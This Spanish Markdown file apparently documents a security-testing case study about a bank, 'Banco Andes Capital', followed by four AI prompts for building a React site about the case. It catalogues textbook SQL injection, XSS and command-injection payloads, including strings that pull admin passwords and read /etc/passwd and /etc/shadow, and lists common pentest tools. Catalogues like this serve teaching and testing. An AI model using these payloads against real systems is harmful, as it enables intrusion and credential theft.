# Prompts de Seguridad - Banco Andes Capital

## Prompts Utilizados en Pruebas

### SQL Injection

```sql
-- Payload básico
' OR '1'='1

-- Unión de tablas
' UNION SELECT username, password FROM admin --

-- Tiempo de espera
' AND SLEEP(5) --

-- Extracción de versión
' UNION SELECT VERSION(), USER() --
```

### Cross-Site Scripting (XSS)

```javascript
// Alert básico
<script>alert('XSS')</script>

// Event handler
<img src=x onerror="alert('XSS')">

// SVG injection
<svg onload="alert('XSS')">
```

### Command Injection

```bash
# Ejecución de comandos
; cat /etc/passwd
| whoami
& id

# Comandos encadenados
; ls -la / | grep flag

# Redirección de salida
; cat /etc/shadow > /tmp/output.txt
```

## Herramientas Utilizadas

- **Burp Suite:** Intercepción y manipulación de tráfico
- **OWASP ZAP:** Escaneo automático de vulnerabilidades
- **SQLMap:** Automatización de SQL Injection
- **XSSStrike:** Detección de XSS
- **Commix:** Detección de Command Injection

## Metodología

1. Reconocimiento del objetivo
2. Mapeo de superficies de ataque
3. Pruebas manuales y automáticas
4. Documentación de hallazgos
5. Verificación de remediación

## Prompt 1
"Organiza la información en 8 archivos Markdown, cada uno dedicado a un aspecto del caso (contexto, actores, vulnerabilidades, impacto económico, impacto social, marco legal, respuesta institucional, lecciones aprendidas)."

## Prompt 2
"Prepara la estructura React para integrar los archivos Markdown como páginas y desplegar el proyecto en Vercel."

## Prompt 3
"Genera ejemplos de tablas en Markdown para ordenar datos del caso con columnas de Descripción, Fuente y Comentario."

## Prompt 4
"Redacta comandos básicos que debo introducir en CMD para inicializar y correr el proyecto React con los archivos Markdown."
